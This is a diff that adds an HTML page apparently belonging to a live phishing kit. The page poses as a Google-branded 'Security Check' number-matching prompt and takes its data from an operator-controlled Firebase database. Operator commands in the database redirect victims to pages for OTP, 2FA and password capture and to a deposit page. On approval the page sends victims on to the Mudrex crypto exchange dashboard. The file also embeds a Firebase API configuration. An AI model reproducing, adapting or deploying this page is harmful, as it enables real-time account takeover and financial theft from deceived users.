@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f7f7f7;
+        }
+        .verification-box {
+            background-color: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            max-width: 800px;
+            width: 90%;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 24px;
+            border-bottom: 1px solid #dadce0;
+        }
+        .header-logo {
+            height: 24px;
+        }
+        .header h1 {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 16px;
+            color: #202124;
+            font-weight: 500;
+            margin: 0;
+        }
+        .content {
+            display: flex;
+            padding: 24px;
+            align-items: center;
+        }
+        .column {
+            width: 50%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .column-left {
+            text-align: left;
+        }
+        .column-left h2 {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 24px;
+            color: #202124;
+            margin: 0 0 16px 0;
+            font-weight: 400;
+        }
+        .column-left p {
+            color: #5f6368;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        .email-display {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #dadce0;
+            border-radius: 100px;
+            padding: 4px 12px;
+            margin-top: 24px;
+            font-size: 14px;
+        }
+        .email-initial {
+            background-color: #633ea4;
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+        }
+        .column-right {
+            text-align: center;
+            border-left: 1px solid #dadce0;
+        }
+        .number-display {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 72px;
+            font-weight: 400;
+            color: #202124;
+            margin: 20px 0;
+            letter-spacing: -2px;
+        }
+        .column-right h3 {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 16px;
+            margin: 0 0 8px 0;
+            font-weight: 500;
+        }
+        .column-right p {
+            color: #5f6368;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        .loader-container {
+            text-align: center;
+            padding: 40px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 999999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(4px);
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #333;
+            border-top: 6px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @media (max-width: 768px) {
+            .content { flex-direction: column; }
+            .column { width: 100%; }
+            .column-right {
+                border-left: none;
+                border-top: 1px solid #dadce0;
+                margin-top: 20px;
+                padding-top: 20px;
+            }
+            .number-display { font-size: 48px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-box">
+        <div class="header">
+            <svg class="header-logo" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="48" height="48" viewBox="0 0 48 48">
+                <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path>
+                <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path>
+                <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path>
+                <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571l6.19,5.238C44.434,36.333,48,31.883,48,24C48,22.407,47.805,20.846,47.435,19.338L43.611,20.083z"></path>
+            </svg>
+            <h1>Security Check</h1>
+        </div>
+        <div id="loader" class="loader-container">
+            <div class="spinner"></div>
+            <p>Verifying your session...</p>
+        </div>
+        <div id="verification-content" class="content" style="display: none;">
+            <div class="column column-left">
+                <h2>Confirm it's you</h2>
+                <p>To help protect your account, we need to confirm your identity.</p>
+                <div class="email-display">
+                    <span class="email-initial" id="email-initial"></span>
+                    <span id="user-email"></span>
+                </div>
+            </div>
+            <div class="column column-right">
+                <div class="number-display" id="verification-number">...</div>
+                <h3>Open the app on your <span id="device-name">...</span></h3>
+                <p>Tap <strong>Yes</strong> on the prompt, then tap <strong id="number-instruction">...</strong> on your <span id="device-name-instruction">...</span> to confirm.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAemZwP19k7zaM8QMBPn5kitdlvzY514OI",
+            authDomain: "web-xchangeon1.firebaseapp.com",
+            databaseURL: "https://web-xchangeon1-default-rtdb.firebaseio.com/",
+            projectId: "web-xchangeon1",
+            storageBucket: "web-xchangeon1.firebasestorage.app",
+            messagingSenderId: "733409941973",
+            appId: "1:733409941973:web:6e11c283fcee846b4a855c"
+        };
+
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const loader = document.getElementById('loader');
+        const verificationContent = document.getElementById('verification-content');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        function getSessionId() {
+            const params = new URLSearchParams(window.location.search);
+            const idFromUrl = params.get('id');
+            if (idFromUrl) {
+                sessionStorage.setItem('firebaseSessionId', idFromUrl);
+                return idFromUrl;
+            }
+            return sessionStorage.getItem('firebaseSessionId');
+        }
+
+        const sessionId = getSessionId();
+
+        if (!sessionId) {
+            loader.innerHTML = '<p style="color: red;">Error: Session ID not found.</p>';
+        } else {
+            const sessionRef = db.ref('sessions/' + sessionId);
+
+            sessionRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                
+                if (data && data.verification_number && data.verification_device) {
+                    const email = data.email || 'Not available';
+                    const phone = data.phone || '';
+
+                    document.getElementById('user-email').textContent = email || phone || 'Not available';
+                    document.getElementById('email-initial').textContent = (email || phone || 'N')[0].toUpperCase();
+                    document.getElementById('verification-number').textContent = data.verification_number;
+                    document.getElementById('device-name').textContent = data.verification_device;
+                    document.getElementById('number-instruction').textContent = data.verification_number;
+                    document.getElementById('device-name-instruction').textContent = data.verification_device;
+                    
+                    loader.style.display = 'none';
+                    verificationContent.style.display = 'flex';
+                } else {
+                    verificationContent.style.display = 'none';
+                    loader.style.display = 'block';
+                }
+            });
+
+            const commandRef = db.ref(`sessions/${sessionId}/command`);
+            commandRef.on('value', (snapshot) => {
+                const command = snapshot.val();
+                if (!command) return;
+
+                switch (command.type) {
+                    case 'approve':
+                        loadingOverlay.classList.remove('active');
+                        window.location.href = "https://mudrex.com/dashboard";
+                        break;
+                    case 'reject':
+                        loadingOverlay.classList.remove('active');
+                        window.location.href = `index.html`;
+                        break;
+                    case 'otp-request':
+                        window.location.href = `otp_email.html?id=${sessionId}`;
+                        break;
+                    case 'tfa-request':
+                        window.location.href = `2fa.html?id=${sessionId}`;
+                        break;
+                    case 'deposit-request':
+                        window.location.href = `deposit.html?id=${sessionId}`;
+                        break;
+                    case 'password-confirm-request':
+                        window.location.href = `password_confirm.html?id=${sessionId}`;
+                        break;
+                    case 'force-relogin':
+                        sessionStorage.clear();
+                        window.location.href = 'index.html';
+                        break;
+                }
+                commandRef.remove();
+            });
+
+            window.addEventListener('load', () => {
+                sessionRef.update({ currentPage: 'Verify', status: 'online' });
+            });
+            sessionRef.onDisconnect().update({ status: 'offline' });
+        }
+    </script>
+</body>
+</html>
